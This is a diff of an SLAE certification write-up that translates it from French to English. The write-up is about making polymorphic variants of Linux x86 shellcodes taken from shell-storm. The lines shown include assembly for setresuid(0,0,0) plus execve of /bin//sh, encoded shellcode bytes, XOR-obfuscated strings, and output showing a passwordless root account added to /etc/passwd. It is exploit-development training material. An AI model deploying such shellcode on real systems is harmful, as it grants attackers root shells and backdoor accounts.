@@ -1,17 +1,17 @@
 # Assignement 6 #
 
-Dans cette section, il est demandé de proposer une version polymorphique de 3 shellcodes(+1 car c'est marrant à faire) issus de la plateforme shellstorm.
+In this section, it is requested to propose a polymorphic version of three shellcodes (+1 just for fun) coming from the shellstorm platform..
  - http://shell-storm.org/shellcode/files/shellcode-220.php
  - http://shell-storm.org/shellcode/files/shellcode-212.php
  - http://shell-storm.org/shellcode/files/shellcode-639.php
  - http://shell-storm.org/shellcode/files/shellcode-548.php
 
-La compilation en assembleur est réalisée avec le script présent ici https://github.com/xophidia/Shellcode/blob/master/compile.sh.
-La compilation en C s'appuie sur le fichier https://github.com/xophidia/Shellcode/blob/master/test_shellcode.c.
-Nous utilisons pour cela la commande `gcc -fno-stack-protector -z execstack test_shellcode.c -o test_shellcode`
+The compilation in assembler is realized here with the present script https://github.com/xophidia/Shellcode/blob/master/compile.sh.  
+The compilation in C is based on the file https://github.com/xophidia/Shellcode/blob/master/test_shellcode.c.  
+We use the command `gcc -fno-stack-protector -z execstack test_shellcode.c -o test_shellcode`
 
 
-## Première modification ##
+## First modification ##
 
 Source : http://shell-storm.org/shellcode/files/shellcode-220.php
 
@@ -22,7 +22,7 @@ Source : http://shell-storm.org/shellcode/files/shellcode-220.php
 --[code]--
 BITS 32
  
-;setresuid(0,0,0)
+; setresuid(0,0,0)
 xor eax, eax
 xor ebx, ebx
 xor ecx, ecx
@@ -30,7 +30,7 @@ cdq
 mov BYTE al, 0xa4
 int 0x80
  
-;execve("/bin//sh", ["/bin//sh", NULL], [NULL])
+; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
 push BYTE 11
 pop eax
 push ecx
@@ -52,7 +52,7 @@ char shellcode [] =
  
 # milw0rm.com [2008-09-29]
 ```
-Version modifiée
+Modified version
 
 ```c
 
@@ -67,7 +67,7 @@ section .text
 
 _start:
 
-   setresuid(0,0,0)
+   ; setresuid(0,0,0)
 
     xor ecx, ecx
     mul ecx
@@ -76,7 +76,7 @@ _start:
     mov al, 0xa4
     int 0x80
 
-   execve("/bin//sh", ["/bin//sh", NULL], [NULL])
+   ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
 
     mul ecx
     push ecx
@@ -97,7 +97,7 @@ taille 36
 $ 
 ```
 
-## Seconde modification ##
+## Second modification ##
 
 Source : http://shell-storm.org/shellcode/files/shellcode-212.php
 
@@ -154,7 +154,7 @@ _start:
     int 0x80
 ```
 
-Nous compilons le tout :
+We compile it all:
 
 ```c
 Taille: 13
@@ -217,7 +217,7 @@ int main(void)
 
 ```
 
-Code modifié:
+Modified code:
 
 ```c
 http://shell-storm.org/shellcode/files/shellcode-639.php
@@ -246,13 +246,13 @@ _start:
 
 ```
 
-Une fois compilé, nous obtenons notre shellcode modifié :
+Once compiled, we get our modified shellcode :
 
 ```c
 "\x6a\x24\x58\xcd\x80\x6a\x58\x58\xbb\xad\xde\xe1\xfe\xb9\x57\xf6\xe0\x15\x81\xc1\x12\x23\x31\x12\xba\x67\x45\x23\x01\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";
 ```
 
-Les 3 codes ont été testés à l'aide du programme ci-dessous :
+The 3 codes have been tested thanks to the program below:
 
 ```c
 #include <stdio.h>
@@ -307,9 +307,9 @@ main()
 }
 ```
 
-En premier, nous n'avons que les opcodes et pas les mnémoniques, du coup nous allons devoir les générer.
+First, we only have thoses opcodes and not mnémonic, so we need to generate them all.
 
-Pour cela nous compilons le programme puis avec objdump nous récuperons la partie [code] afin de pouvoir comprendre ce que ce shellcode fait.
+We compile the program and extract them with objdump. The goal si to understand what the shellcode do.
 
  `gcc fno-stack-protector -z execstack test_shellcode.c -o test_shellcode`
 
@@ -348,7 +348,7 @@ Pour cela nous compilons le programme puis avec objdump nous récuperons la part
 804a091:	cd 80                	int    0x80
 ```
 
-Nous procédons donc à la modification de ce code.
+We proceed on the modification of the code.
 
 ```c
  ; Shell-storm.org/shellcode/files/shellcode-548.php
@@ -381,7 +381,7 @@ Nous procédons donc à la modification de ce code.
 
 	xchg   ebx,eax		; Save the result
 
-    ; the content of the string is xored with Oxed beofre we push it
+    ; the content of the string is xored with Oxed before we push it
 
 	xor    eax,eax                  
 	push   0x859ec283	; hs/n
@@ -430,13 +430,6 @@ sudo ./test_shellcode
 xophidia@xophidia-VirtualBox:~/Documents/Shellcode/as6$ more /etc/passwd | tail -1
 bob::0:0::/://bin/sh
 ````
-
-
-
-
-
-
-
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
 
